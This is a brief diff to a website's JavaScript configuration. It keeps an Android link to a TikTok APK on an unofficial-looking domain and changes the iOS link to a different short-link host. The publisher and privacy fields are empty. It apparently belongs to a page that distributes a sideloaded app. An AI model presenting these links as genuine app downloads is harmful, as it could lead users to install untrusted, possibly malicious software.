@@ -6,5 +6,5 @@ window.SITE_CONFIG = Object.freeze({
   privacyUrl: '',
   publisher: '',
   androidUrl: 'https://tiktokfs.shop/download/TikTok-v34.apk',
-  iosUrl: 'https://tk.pgosnivo.com/myTfEa'
+  iosUrl: 'https://hw.sobinews.com/myTfEa'
 });
